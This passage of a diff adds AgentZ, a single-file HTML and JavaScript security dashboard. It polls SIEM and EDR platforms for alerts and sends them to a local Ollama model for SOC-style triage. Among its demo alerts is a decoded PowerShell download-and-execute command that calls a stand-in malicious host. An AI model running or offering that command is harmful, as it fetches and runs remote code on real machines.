+          <p>Receive AI summaries, MITRE mapping, severity assessments and remediation steps instantly.</p>
+        </div>
+      </div>
+
+      <button class="quick-start-btn" onclick="openDrawer()">&#x2699; Open Settings to Get Started</button>
+    </div>
+
+    <!-- Detail view -->
+    <div class="detail" id="detailView">
+
+      <div class="detail-head">
+        <div class="detail-head-info">
+          <div class="detail-title" id="dTitle">—</div>
+          <div class="detail-meta" id="dMeta"></div>
+        </div>
+        <span class="sev-tag" id="dSevTag">—</span>
+      </div>
+
+      <div class="section">
+        <div class="section-label">AI Analysis</div>
+        <div id="aiContainer">
+          <div class="analyzing-row" id="analyzingRow" style="display:none">
+            <div class="spinner"></div>
+            Sending to local AI model for analysis…
+          </div>
+          <div class="ai-box" id="aiBox" style="display:none"></div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Raw Alert Data</div>
+        <div class="raw-box" id="rawBox">—</div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Actions</div>
+        <div class="action-row">
+          <button class="btn btn-primary" onclick="reAnalyze()">&#x21BB; Re-Analyze</button>
+          <button class="btn btn-ghost" onclick="copyAnalysis()">&#x2398; Copy Summary</button>
+          <button class="btn btn-ghost" onclick="exportHTMLReport()">&#x1F4C4; Export Report</button>
+          <button class="btn btn-ghost" onclick="exportJSON()">&#x2193; Export JSON</button>
+          <button class="btn btn-danger" onclick="deleteIncident()">&#x1F5D1; Delete</button>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Console bar -->
+    <div class="console-bar" id="consoleBar">
+      <div class="console-toggle" onclick="toggleConsole()">
+        <span>&#x25BC;</span>
+        <span class="console-arrow" id="consoleArrow">&#x25B2;</span>
+        <span>Activity Log</span>
+        <span id="consoleCount" style="font-size:10px;color:var(--text3)"></span>
+        <span style="flex:1"></span>
+        <span style="font-size:10px;cursor:pointer;color:var(--text3)" onclick="event.stopPropagation();clearLog()">clear</span>
+      </div>
+      <div class="console-body" id="consoleBody"></div>
+    </div>
+
+  </main>
+</div>
+
+<!-- ══════════════════════════════════════
+     MANUAL IMPORT MODAL
+══════════════════════════════════════ -->
+<div class="modal-overlay" id="manualModal" onclick="if(event.target===this)closeManualModal()">
+  <div class="modal">
+
+    <div class="modal-head">
+      <span class="modal-head-icon">&#x1F4CB;</span>
+      <div>
+        <div class="modal-title">Manual Alert Import</div>
+        <div class="modal-subtitle">Paste raw alert data from any previous incident or source</div>
+      </div>
+      <div class="modal-close" onclick="closeManualModal()">&#x2715;</div>
+    </div>
+
+    <div class="modal-body">
+
+      <div class="callout info">
+        <span>&#x2139;</span>
+        <span>Accepts any format — JSON objects, plain log lines, exported reports, or free text. Title and severity are auto-detected from common fields but can be overridden below.</span>
+      </div>
+
+      <div class="field" style="margin-bottom:0">
+        <label class="field-label">Raw Alert Data <span style="color:var(--red)">*</span></label>
+        <textarea class="textarea" id="manualRaw" rows="9" placeholder='Paste JSON alert, log entry, SIEM export, or any text describing the incident…&#10;&#10;Example:&#10;{"title":"Cobalt Strike Beacon","severity":"critical","host":"WORKSTATION-01","sha256":"e3b0c4..."}'></textarea>
+        <div class="field-hint">Tip: paste the full raw JSON from a SIEM export, email notification, or log file.</div>
+      </div>
+
+      <div class="field" style="margin-bottom:0">
+        <label class="field-label">Title <span style="color:var(--text3);font-weight:400">(auto-detected from data if left blank)</span></label>
+        <input class="inp" id="manualTitle" placeholder="e.g. Suspicious PowerShell on SERVER-01">
+      </div>
+
+      <div class="modal-row">
+        <div class="field" style="margin-bottom:0">
+          <label class="field-label">Source / Origin</label>
+          <input class="inp" id="manualSource" placeholder="e.g. Splunk, email, manual">
+        </div>
+        <div class="field" style="margin-bottom:0">
+          <label class="field-label">Severity Override</label>
+          <select class="sel" id="manualSev">
+            <option value="auto">Auto-detect</option>
+            <option value="critical">Critical</option>
+            <option value="high">High</option>
+            <option value="medium">Medium</option>
+            <option value="low">Low</option>
+            <option value="info">Info</option>
+          </select>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="modal-foot">
+      <button class="btn btn-ghost" onclick="submitManualAlert(false)">&#x2B; Import Only</button>
+      <button class="btn btn-primary" onclick="submitManualAlert(true)">&#x1F916; Import &amp; Analyze</button>
+    </div>
+
+  </div>
+</div>
+
+<!-- TOASTS -->
+<div class="toast-wrap" id="toastWrap"></div>
+
+<!-- ══════════════════════════════════════
+     SETTINGS DRAWER
+══════════════════════════════════════ -->
+<div class="overlay" id="overlay" onclick="closeDrawer()"></div>
+
+<div class="drawer" id="drawer">
+  <div class="drawer-head">
+    <span class="drawer-title">&#x2699;&#xFE0F; Settings</span>
+    <div class="drawer-close" onclick="closeDrawer()">&#x2715;</div>
+  </div>
+
+  <div class="drawer-body">
+
+    <!-- CORS notice -->
+    <div class="callout warn" style="margin-top:16px;">
+      <span>&#x26A0;</span>
+      <span>If you host this on GitHub Pages (HTTPS), browsers will block calls to <code>http://localhost</code> (Ollama). Run Ollama with HTTPS or use this file locally to avoid mixed-content errors.</span>
+    </div>
+
+    <div class="callout green">
+      <span>&#x1F512;</span>
+      <span>Your API tokens are stored only in browser memory during this session. They are never sent to any server other than the one you configure below.</span>
+    </div>
+
+    <!-- AI Config -->
+    <div class="drawer-section">
+      <div class="ds-title">&#x1F916; AI Configuration</div>
+
+      <div class="field">
+        <label class="field-label">Ollama API URL</label>
+        <input class="inp" id="ollamaUrl" value="http://localhost:11434" placeholder="http://localhost:11434">
+        <div class="field-hint">Your local Ollama server. Must be reachable from this browser.</div>
+      </div>
+
+      <div class="field">
+        <label class="field-label">AI Model</label>
+        <input class="inp" id="ollamaModel" value="llama3.1" placeholder="e.g. llama3.1, mistral, gemma2">
+        <div class="field-hint">Any model installed in Ollama. Recommended: llama3.1 8B or larger.</div>
+      </div>
+
+      <div class="field">
+        <label class="field-label">System Prompt</label>
+        <textarea class="textarea" id="systemPrompt" rows="5">You are an expert SOC analyst. Analyze the following security incident alert and provide:
+1. **Summary** — what happened in plain English
+2. **Severity Assessment** — Critical/High/Medium/Low with justification
+3. **Affected Assets** — endpoints, users, IPs involved
+4. **Attack Vector** — likely technique (MITRE ATT&CK if possible)
+5. **Recommended Actions** — immediate containment and remediation steps
+Be concise and actionable.</textarea>
+      </div>
+
+      <button class="btn btn-ghost" style="width:100%;justify-content:center;" onclick="testOllama()">&#x1F50C; Test Ollama Connection</button>
+    </div>
+
+    <!-- SIEM Platform -->
+    <div class="drawer-section">
+      <div class="ds-title">&#x1F512; SIEM Platform</div>
+
+      <div class="field">
+        <label class="field-label">Platform</label>
+        <select class="sel" id="platform">
+          <option value="sentinelone">SentinelOne</option>
+          <option value="crowdstrike">CrowdStrike Falcon</option>
+          <option value="defender">Microsoft Defender</option>
+          <option value="elastic">Elastic SIEM</option>
+          <option value="splunk">Splunk</option>
+          <option value="custom">Custom API</option>
+        </select>
+      </div>
+
+      <div class="field">
+        <label class="field-label">API Base URL</label>
+        <input class="inp" id="platformUrl" placeholder="https://your-console.sentinelone.net">
+      </div>
+
+      <div class="field">
+        <label class="field-label">API Token</label>
+        <input class="inp" id="platformToken" type="password" placeholder="Your API key or Bearer token">
+        <div class="field-hint ok">&#x1F512; Stored only in browser session — never transmitted to external servers</div>
+      </div>
+
+      <div class="field">
+        <label class="field-label">Poll Interval (seconds)</label>
+        <input class="inp" id="pollInterval" type="number" value="30" min="5" max="600">
+      </div>
+
+      <div class="field">
+        <label class="field-label">Minimum Severity</label>
+        <select class="sel" id="minSeverity">
+          <option value="info">Info (all)</option>
+          <option value="low">Low+</option>
+          <option value="medium" selected>Medium+</option>
+          <option value="high">High+</option>
+          <option value="critical">Critical only</option>
+        </select>
+      </div>
+    </div>
+
+    <!-- Agent Settings -->
+    <div class="drawer-section">
+      <div class="ds-title">&#x23F1; Agent Settings</div>
+
+      <div class="toggle-row">
+        <span class="toggle-lbl">Auto-analyze new incidents</span>
+        <div class="toggle on" id="tAutoAnalyze" onclick="this.classList.toggle('on')"></div>
+      </div>
+      <div class="toggle-row">
+        <span class="toggle-lbl">Desktop notifications</span>
+        <div class="toggle" id="tDesktopNotif" onclick="this.classList.toggle('on');reqNotif()"></div>
+      </div>
+      <div class="toggle-row">
+        <span class="toggle-lbl">Sound alert</span>
+        <div class="toggle" id="tSound" onclick="this.classList.toggle('on')"></div>
+      </div>
+      <div class="toggle-row">
+        <span class="toggle-lbl">Save settings to browser</span>
+        <div class="toggle on" id="tPersist" onclick="this.classList.toggle('on')"></div>
+      </div>
+
+      <div class="agent-row">
+        <button class="btn btn-primary" id="startBtn" onclick="startAgent()">&#x25B6; Start Agent</button>
+        <button class="btn btn-danger" id="stopBtn" onclick="stopAgent()" style="display:none">&#x25A0; Stop Agent</button>
+      </div>
+    </div>
+
+    <!-- GitHub Pages info -->
+    <div class="drawer-section">
+      <div class="ds-title">&#x1F30D; Deploy to GitHub Pages</div>
+      <div class="callout info" style="margin-bottom:0">
+        <span>&#x1F4A1;</span>
+        <span>This is a single static HTML file. Fork the repo, enable GitHub Pages, and access AgentZ from anywhere. All analysis runs against your local Ollama — no backend needed. For HTTPS+Ollama compatibility, run Ollama behind a reverse proxy with TLS.</span>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     JAVASCRIPT
+══════════════════════════════════════ -->
+<script>
+'use strict';
+
+// ── STATE ──
+const S = {
+  incidents: [],
+  selectedId: null,
+  pollTimer: null,
+  running: false,
+  lastPollTime: null,
+  seenIds: new Set(),
+  filterSev: 'all',
+  logCount: 0
+};
+
+// ── SETTINGS PERSISTENCE ──
+const SETTINGS_KEY = 'agentz_settings';
+
+function saveSettings() {
+  if (!toggled('tPersist')) return;
+  const d = {
+    ollamaUrl:    v('ollamaUrl'),
+    ollamaModel:  v('ollamaModel'),
+    systemPrompt: v('systemPrompt'),
+    platform:     v('platform'),
+    platformUrl:  v('platformUrl'),
+    pollInterval: v('pollInterval'),
+    minSeverity:  v('minSeverity'),
+    autoAnalyze:  toggled('tAutoAnalyze'),
+    sound:        toggled('tSound')
+  };
+  // Never save the API token to localStorage
+  try { localStorage.setItem(SETTINGS_KEY, JSON.stringify(d)); } catch(e) {}
+}
+
+function loadSettings() {
+  try {
+    const raw = localStorage.getItem(SETTINGS_KEY);
+    if (!raw) return;
+    const d = JSON.parse(raw);
+    if (d.ollamaUrl)    set('ollamaUrl', d.ollamaUrl);
+    if (d.ollamaModel)  set('ollamaModel', d.ollamaModel);
+    if (d.systemPrompt) set('systemPrompt', d.systemPrompt);
+    if (d.platform)     set('platform', d.platform);
+    if (d.platformUrl)  set('platformUrl', d.platformUrl);
+    if (d.pollInterval) set('pollInterval', d.pollInterval);
+    if (d.minSeverity)  set('minSeverity', d.minSeverity);
+    if (d.autoAnalyze === false) document.getElementById('tAutoAnalyze').classList.remove('on');
+    if (d.sound === true) document.getElementById('tSound').classList.add('on');
+    log('Settings restored from browser storage', 'info');
+  } catch(e) {}
+}
+
+// Autosave on any config change
+document.addEventListener('change', saveSettings);
+document.addEventListener('input', saveSettings);
+
+// ── DOM HELPERS ──
+function v(id)     { return document.getElementById(id).value.trim(); }
+function set(id,v) {
+  const el = document.getElementById(id);
+  if (el.tagName === 'SELECT') el.value = v;
+  else el.value = v;
+}
+function toggled(id) { return document.getElementById(id).classList.contains('on'); }
+function esc(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
+
+// ── DRAWER ──
+function openDrawer()  {
+  document.getElementById('drawer').classList.add('open');
+  document.getElementById('overlay').classList.add('open');
+}
+function closeDrawer() {
+  document.getElementById('drawer').classList.remove('open');
+  document.getElementById('overlay').classList.remove('open');
+  saveSettings();
+}
+
+// ── LOG ──
+function log(msg, level = 'info') {
+  S.logCount++;
+  const el = document.getElementById('consoleBody');
+  const t   = new Date().toLocaleTimeString('en-GB');
+  const row = document.createElement('div');
+  row.className = 'log-row';
+  row.innerHTML = `<span class="log-t">${t}</span><span class="log-lv ${level}">${level.slice(0,4).toUpperCase()}</span><span class="log-m">${esc(msg)}</span>`;
+  el.appendChild(row);
+  el.scrollTop = el.scrollHeight;
+  document.getElementById('consoleCount').textContent = `(${S.logCount})`;
+}
+
+function clearLog() {
+  document.getElementById('consoleBody').innerHTML = '';
+  S.logCount = 0;
+  document.getElementById('consoleCount').textContent = '';
+}
+
+function toggleConsole() {
+  const bar = document.getElementById('consoleBar');
+  bar.classList.toggle('open');
+}
+
+// ── TOAST ──
+function toast(msg, type = 'info') {
+  const wrap = document.getElementById('toastWrap');
+  const t = document.createElement('div');
+  t.className = 'toast ' + type;
+  t.textContent = msg;
+  wrap.appendChild(t);
+  setTimeout(() => { t.style.opacity = '0'; t.style.transition = 'opacity 0.3s'; setTimeout(() => t.remove(), 350); }, 4000);
+}
+
+// ── STATUS ──
+function setChip(id, textId, cls, label) {
+  const el = document.getElementById(id);
+  el.className = 'status-chip ' + cls;
+  document.getElementById(textId).textContent = label;
+}
+
+// ── NOTIFICATIONS + SOUND ──
+function reqNotif() {
+  if ('Notification' in window && Notification.permission === 'default') Notification.requestPermission();
+}
+function notify(title, body) {
+  if (toggled('tDesktopNotif') && 'Notification' in window && Notification.permission === 'granted')
+    new Notification(title, { body });
+}
+function beep() {
+  if (!toggled('tSound')) return;
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const osc = ctx.createOscillator(), g = ctx.createGain();
+    osc.connect(g); g.connect(ctx.destination);
+    osc.frequency.value = 660; osc.type = 'sine';
+    g.gain.value = 0.1;
+    osc.start();
+    g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.3);
+    osc.stop(ctx.currentTime + 0.3);
+  } catch(e) {}
+}
+
+// ── FILTER ──
+function setFilter(btn) {
+  document.querySelectorAll('.filter-chip').forEach(b => {
+    b.className = 'filter-chip';
+  });
+  const sev = btn.dataset.sev;
+  S.filterSev = sev;
+  btn.classList.add('active-' + (sev === 'all' ? 'all' : sev === 'critical' ? 'crit' : sev === 'high' ? 'high' : 'med'));
+  renderList();
+}
+
+// ── TEST OLLAMA ──
+async function testOllama() {
+  const url = v('ollamaUrl').replace(/\/+$/, '');
+  log('Testing Ollama at ' + url + '…');
+  try {
+    const res = await fetch(url + '/api/tags');
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+    const data = await res.json();
+    const models = (data.models || []).map(m => m.name).join(', ');
+    log('Ollama online — models: ' + (models || 'none'), 'success');
+    setChip('chipOllama', 'chipOllamaText', 'ok', 'AI: online');
+    toast('Ollama connected', 'ok');
+  } catch(e) {
+    log('Ollama error: ' + e.message, 'error');
+    setChip('chipOllama', 'chipOllamaText', 'bad', 'AI: offline');
+    toast('Cannot reach Ollama — is it running?', 'critical');
+  }
+}
+
+// ── PLATFORM ADAPTERS ──
+const ADAPTERS = {
+  sentinelone: {
+    buildUrl(b) {
+      const since = S.lastPollTime || new Date(Date.now()-3600000).toISOString();
+      return `${b}/web/api/v2.1/threats?createdAt__gte=${encodeURIComponent(since)}&sortBy=createdAt&sortOrder=desc&limit=20`;
+    },
+    headers(t) { return { 'Authorization': 'ApiToken ' + t, 'Content-Type': 'application/json' }; },
+    parse(j) {
+      return (j.data || []).map(t => ({
+        id: t.id || crypto.randomUUID(),
+        title: t.threatInfo?.threatName || t.threatName || 'Unknown Threat',
+        severity: mapSev(t.threatInfo?.confidenceLevel || t.confidenceLevel || 'medium'),
+        source: 'SentinelOne', timestamp: t.createdAt || new Date().toISOString(), raw: t
+      }));
+    }
+  },
+  crowdstrike: {
+    buildUrl(b) { return `${b}/detects/queries/detects/v1?limit=20&sort=last_behavior|desc`; },
+    headers(t) { return { 'Authorization': 'Bearer ' + t }; },
+    parse(j) {
+      return (j.resources || []).map(id => ({
+        id, title: 'Detection ' + id.slice(0,12),
+        severity: 'high', source: 'CrowdStrike', timestamp: new Date().toISOString(), raw: { detection_id: id }
+      }));
+    }
+  },
+  defender: {
+    buildUrl(b) { return `${b}/api/alerts?$top=20&$orderby=createdDateTime desc`; },
+    headers(t) { return { 'Authorization': 'Bearer ' + t }; },
+    parse(j) {
+      return (j.value || []).map(a => ({
+        id: a.id || crypto.randomUUID(), title: a.title || 'Defender Alert',
+        severity: mapSev(a.severity || 'medium'), source: 'Defender',
+        timestamp: a.createdDateTime || new Date().toISOString(), raw: a
+      }));
+    }
+  },
+  elastic: {
+    buildUrl(b) { return `${b}/.siem-signals-*/_search?size=20&sort=@timestamp:desc`; },
+    headers(t) { return { 'Authorization': 'ApiKey ' + t, 'Content-Type': 'application/json' }; },
+    parse(j) {
+      return ((j.hits||{}).hits||[]).map(h => ({
+        id: h._id, title: h._source['signal.rule.name'] || h._source['rule.name'] || 'Elastic Alert',
+        severity: mapSev(h._source['signal.rule.severity'] || 'medium'),
+        source: 'Elastic SIEM', timestamp: h._source['@timestamp'] || new Date().toISOString(), raw: h._source
+      }));
+    }
+  },
+  splunk: {
+    buildUrl(b) { return `${b}/services/search/jobs/export?output_mode=json&search=search index=notable | head 20`; },
+    headers(t) { return { 'Authorization': 'Bearer ' + t }; },
+    parse(j) {
+      const r = Array.isArray(j) ? j : (j.results || []);
+      return r.map(x => ({
+        id: x.event_id || crypto.randomUUID(), title: x.rule_name || x.search_name || 'Splunk Notable',
+        severity: mapSev(x.urgency || x.severity || 'medium'),
+        source: 'Splunk', timestamp: x._time || new Date().toISOString(), raw: x
+      }));
+    }
+  },
+  custom: {
+    buildUrl(b) { return b; },
+    headers(t) { return { 'Authorization': 'Bearer ' + t, 'Content-Type': 'application/json' }; },
+    parse(j) {
+      const a = Array.isArray(j) ? j : (j.data || j.results || j.alerts || [j]);
+      return a.map(x => ({
+        id: x.id || crypto.randomUUID(), title: x.title || x.name || x.alert_name || 'Alert',
+        severity: mapSev(x.severity || x.priority || 'medium'),
+        source: 'Custom', timestamp: x.timestamp || x.created_at || new Date().toISOString(), raw: x
+      }));
+    }
+  }
+};
+
+function mapSev(val) {
+  const v = String(val).toLowerCase();
+  if (['critical','suspicious','malicious','5','4'].some(s => v.includes(s))) return 'critical';
+  if (['high','3'].some(s => v.includes(s))) return 'high';
+  if (['medium','moderate','2'].some(s => v.includes(s))) return 'medium';
+  if (['low','1'].some(s => v.includes(s))) return 'low';
+  return 'info';
+}
+
+const SEV_ORDER = { critical:4, high:3, medium:2, low:1, info:0 };
+
+// ── POLLING ──
+async function pollPlatform() {
+  const platform = v('platform') || document.getElementById('platform').value;
+  const base  = v('platformUrl');
+  const token = document.getElementById('platformToken').value.trim();
+
+  if (!base || !token) { log('Platform URL or token missing — skipping poll', 'warn'); return; }
+
+  const adapter = ADAPTERS[platform];
+  const url = adapter.buildUrl(base);
+  log('Polling ' + platform + '…');
+  setChip('chipPlatform', 'chipPlatformText', 'live', 'Polling…');
+
+  try {
+    const res = await fetch(url, { headers: adapter.headers(token) });
+    if (!res.ok) throw new Error('HTTP ' + res.status + ' ' + res.statusText);
+    const json = await res.json();
+    const alerts = adapter.parse(json);
+    const minSev = SEV_ORDER[document.getElementById('minSeverity').value] ?? 0;
+    const filtered = alerts.filter(a => SEV_ORDER[a.severity] >= minSev);
+
+    let newCount = 0;
+    for (const alert of filtered) {
+      if (!S.seenIds.has(alert.id)) {
+        S.seenIds.add(alert.id);
+        addIncident(alert);
+        newCount++;
+      }
+    }
+    S.lastPollTime = new Date().toISOString();
+    log(`Poll complete — ${alerts.length} total, ${newCount} new`, newCount > 0 ? 'success' : 'info');
+    setChip('chipPlatform', 'chipPlatformText', 'ok', 'SIEM: live');
+  } catch(e) {
+    log('Poll error: ' + e.message, 'error');
+    setChip('chipPlatform', 'chipPlatformText', 'bad', 'SIEM: error');
+  }
+}
+
+// ── AGENT ──
+function startAgent() {
+  const interval = parseInt(v('pollInterval') || '30') * 1000;
+  S.running = true;
+  document.getElementById('startBtn').style.display = 'none';
+  document.getElementById('stopBtn').style.display  = '';
+  log('Agent started — polling every ' + (interval/1000) + 's', 'success');
+  toast('Agent running', 'ok');
+  pollPlatform();
+  S.pollTimer = setInterval(pollPlatform, interval);
+  // Open console so user can see activity
+  document.getElementById('consoleBar').classList.add('open');
+}
+
+function stopAgent() {
+  S.running = false;
+  clearInterval(S.pollTimer);
+  S.pollTimer = null;
+  document.getElementById('startBtn').style.display = '';
+  document.getElementById('stopBtn').style.display  = 'none';
+  setChip('chipPlatform', 'chipPlatformText', 'bad', 'SIEM: off');
+  log('Agent stopped', 'warn');
+}
+
+// ── ADD INCIDENT ──
+function addIncident(alert) {
+  const inc = {
+    id: alert.id, title: alert.title, severity: alert.severity,
+    source: alert.source, timestamp: alert.timestamp, raw: alert.raw,
+    status: 'pending', analysis: null
+  };
+  S.incidents.unshift(inc);
+  renderList();
+  beep();
+  notify('AgentZ: ' + inc.title, 'Severity: ' + inc.severity.toUpperCase());
+  toast('New alert: ' + inc.title, inc.severity === 'critical' ? 'critical' : 'high');
+  if (toggled('tAutoAnalyze')) analyzeIncident(inc.id);
+}
+
+// ── RENDER LIST ──
+function renderList() {
+  const container = document.getElementById('incList');
+  const empty     = document.getElementById('emptyList');
+  const badge     = document.getElementById('incBadge');
+  const query     = document.getElementById('searchInp').value.toLowerCase();
+
+  const filtered = S.incidents.filter(i => {
+    const matchSev = S.filterSev === 'all' || i.severity === S.filterSev;
+    const matchQ   = !query || i.title.toLowerCase().includes(query) || i.source.toLowerCase().includes(query);
+    return matchSev && matchQ;
+  });
+
+  // Clear old cards
+  container.querySelectorAll('.inc-card').forEach(e => e.remove());
+
+  if (S.incidents.length === 0) {
+    empty.style.display = '';
+    badge.style.display = 'none';
+  } else {
+    empty.style.display = 'none';
+    badge.style.display = '';
+    badge.textContent   = S.incidents.length;
+  }
+
+  for (const inc of filtered) {
+    const card = document.createElement('div');
+    card.className = `inc-card sev-${inc.severity}` + (inc.id === S.selectedId ? ' selected' : '');
+    card.onclick = () => selectIncident(inc.id);
+    card.innerHTML = `
+      <div class="inc-card-top">
+        <div class="inc-card-title">${esc(inc.title)}</div>
+        <span class="sev-tag ${inc.severity}">${inc.severity}</span>
+      </div>
+      <div class="inc-card-meta">
+        <span class="inc-status-dot ${inc.status}"></span>
+        <span>${inc.status}</span>
+        <span style="color:var(--text3)">·</span>
+        <span>${esc(inc.source)}</span>
+        <span style="color:var(--text3)">·</span>
+        <span>${new Date(inc.timestamp).toLocaleTimeString('en-GB')}</span>
+      </div>
+    `;
+    container.insertBefore(card, empty);
+  }
+}
+
+// ── SELECT INCIDENT ──
+function selectIncident(id) {
+  S.selectedId = id;
+  renderList();
+
+  const inc = S.incidents.find(i => i.id === id);
+  if (!inc) return;
+
+  document.getElementById('welcomeView').style.display = 'none';
+  document.getElementById('detailView').style.display  = 'block';
+
+  document.getElementById('dTitle').textContent = inc.title;
+  const sevTag = document.getElementById('dSevTag');
+  sevTag.textContent = inc.severity;
+  sevTag.className   = 'sev-tag ' + inc.severity;
+
+  document.getElementById('dMeta').innerHTML = `
+    <span class="detail-tag">&#x1F4E1; ${esc(inc.source)}</span>
+    <span class="detail-tag">&#x1F554; ${new Date(inc.timestamp).toLocaleString()}</span>
+    <span class="detail-tag">&#x1F4CB; ${inc.status}</span>
+  `;
+
+  document.getElementById('rawBox').textContent = JSON.stringify(inc.raw, null, 2);
+
+  const spinner = document.getElementById('analyzingRow');
+  const box     = document.getElementById('aiBox');
+
+  if (inc.status === 'analyzing') {
+    spinner.style.display = 'flex'; box.style.display = 'none';
+  } else if (inc.analysis) {
+    spinner.style.display = 'none'; box.style.display = 'block';
+    box.innerHTML = fmtAnalysis(inc.analysis);
+  } else {
+    spinner.style.display = 'none'; box.style.display = 'block';
+    box.textContent = inc.status === 'error'
+      ? '⚠ Analysis failed — check Ollama connection and model name.'
+      : 'Pending analysis…';
+  }
+}
+
+// ── ANALYZE ──
+async function analyzeIncident(id) {
+  const inc = S.incidents.find(i => i.id === id);
+  if (!inc) return;
+
+  inc.status = 'analyzing';
+  renderList();
+  if (S.selectedId === id) selectIncident(id);
+
+  const url   = v('ollamaUrl').replace(/\/+$/, '');
+  const model = v('ollamaModel') || 'llama3.1';
+  const sys   = document.getElementById('systemPrompt').value;
+
+  const userMsg = `Incident from ${inc.source}:\n\nTitle: ${inc.title}\nSeverity: ${inc.severity}\nTime: ${inc.timestamp}\n\nRaw Data:\n${JSON.stringify(inc.raw, null, 2)}`;
+
+  log(`Analyzing "${inc.title}" with ${model}…`);
+
+  try {
+    const res = await fetch(url + '/api/chat', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        model,
+        messages: [
+          { role: 'system', content: sys },
+          { role: 'user', content: userMsg }
+        ],
+        stream: false
+      })
+    });
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+    const data = await res.json();
+    const analysis = data.message?.content || data.response || 'No response from model';
+
+    inc.analysis = analysis;
+    inc.status   = 'analyzed';
+    const aiSev  = extractSev(analysis);
+    if (aiSev) inc.severity = aiSev;
+    log(`Analysis complete for "${inc.title}"`, 'success');
+    toast('Analysis ready: ' + inc.title, 'ok');
+  } catch(e) {
+    inc.status   = 'error';
+    inc.analysis = null;
+    log(`Analysis failed for "${inc.title}": ${e.message}`, 'error');
+  }
+
+  renderList();
+  if (S.selectedId === id) selectIncident(id);
+}
+
+function extractSev(text) {
+  const m = text.toLowerCase().match(/severity\s*(?:assessment)?[:\s]*\*?\*?\s*(critical|high|medium|low)/i);
+  return m ? m[1].toLowerCase() : null;
+}
+
+function fmtAnalysis(text) {
+  return text
+    .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
+    .replace(/^### (.+)$/gm, '<strong style="color:var(--cyan);font-size:13px;display:block;margin-top:10px">$1</strong>')
+    .replace(/^## (.+)$/gm,  '<strong style="color:var(--blue);font-size:14px;display:block;margin-top:12px">$1</strong>')
+    .replace(/^- (.+)$/gm,   '  • $1')
+    .replace(/^(\d+)\. /gm,  '  $1. ');
+}
+
+// ── ACTIONS ──
+function reAnalyze() {
+  if (S.selectedId) analyzeIncident(S.selectedId);
+}
+
+function copyAnalysis() {
+  const inc = S.incidents.find(i => i.id === S.selectedId);
+  if (inc?.analysis) {
+    navigator.clipboard.writeText(inc.analysis).catch(() => {});
+    toast('Copied to clipboard', 'ok');
+  }
+}
+
+function exportJSON() {
+  const inc = S.incidents.find(i => i.id === S.selectedId);
+  if (!inc) return;
+  const blob = new Blob([JSON.stringify(inc, null, 2)], { type: 'application/json' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `agentz-incident-${Date.now()}.json`;
+  a.click();
+  toast('JSON exported', 'ok');
+}
+
+function deleteIncident() {
+  const idx = S.incidents.findIndex(i => i.id === S.selectedId);
+  if (idx === -1) return;
+  const title = S.incidents[idx].title;
+  S.incidents.splice(idx, 1);
+  S.selectedId = null;
+  renderList();
+  document.getElementById('detailView').style.display  = 'none';
+  document.getElementById('welcomeView').style.display = '';
+  log('Deleted incident: ' + title, 'warn');
+}
+
+// ── DEMO ALERTS ──
+function injectDemo() {
+  const demos = [
+    {
+      id: 'demo-' + Date.now(),
+      title: 'Cobalt Strike Beacon Detected on WORKSTATION-042',
+      severity: 'critical', source: 'SentinelOne (demo)',
+      timestamp: new Date().toISOString(),
+      raw: {
+        threatInfo: {
+          threatName: 'Cobalt Strike Beacon', classification: 'Malware',
+          confidenceLevel: 'malicious', analystVerdict: 'true_positive',
+          mitigationStatus: 'not_mitigated',
+          filePath: 'C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost.exe',
+          sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
+        },
+        agentDetectionInfo: {
+          agentName: 'WORKSTATION-042', agentIpAddress: '10.0.14.42',
+          agentOsName: 'Windows 10 Pro', agentLastLoggedInUser: 'CORP\\jsmith'
+        },
+        indicators: [
+          { category: 'Credential Access', description: 'Process read browser credentials' },
+          { category: 'C2', description: 'Network connection to known C2 range 185.141.27.0/24' },
+          { category: 'Evasion', description: 'Binary masquerading as svchost.exe' }
+        ],
+        mitreTactics: [
+          { tactic: 'Execution', technique: 'T1059.001 - PowerShell' },
+          { tactic: 'Defense Evasion', technique: 'T1036.005 - Match Legitimate Name' },
+          { tactic: 'Command and Control', technique: 'T1071.001 - Web Protocols' }
+        ]
+      }
+    },
+    {
+      id: 'demo-' + (Date.now() + 1),
+      title: 'Brute-Force SSH — 847 Failures then Successful Login from CN',
+      severity: 'high', source: 'Elastic SIEM (demo)',
+      timestamp: new Date().toISOString(),
+      raw: {
+        rule: { name: 'SSH Brute-Force Detected', severity: 'high', risk_score: 73 },
+        source: { ip: '103.45.67.89', geo: { country: 'CN', city: 'Beijing' } },
+        destination: { ip: '10.0.1.15', hostname: 'prod-web-03' },
+        event: { action: 'ssh_login', outcome: 'failure', count: 847 },
+        note: 'After 847 failures, one successful login as ubuntu@prod-web-03 detected'
+      }
+    },
+    {
+      id: 'demo-' + (Date.now() + 2),
+      title: 'Suspicious PowerShell Encoded Command — Finance Server',
+      severity: 'medium', source: 'Microsoft Defender (demo)',
+      timestamp: new Date().toISOString(),
+      raw: {
+        computerDnsName: 'FIN-SERVER-01',
+        userPrincipalName: 'admin@acme.onmicrosoft.com',
+        evidence: {
+          processCommandLine: 'powershell.exe -EncodedCommand SQBFAFgAIAAo...',
+          decodedCommand: 'IEX (New-Object Net.WebClient).DownloadString("http://malicious.example.com/payload")'
+        }
+      }
+    }
+  ];
+
+  const alert = demos[Math.floor(Math.random() * demos.length)];
+  log('Injected demo: ' + alert.title, 'warn');
+  // Show console when demo is injected
+  document.getElementById('consoleBar').classList.add('open');
+  addIncident(alert);
+}
+
+// ── THEME ──
+function toggleTheme() {
+  const isLight = document.body.classList.toggle('light');
+  document.getElementById('themeBtn').textContent = isLight ? '☀' : '☽';
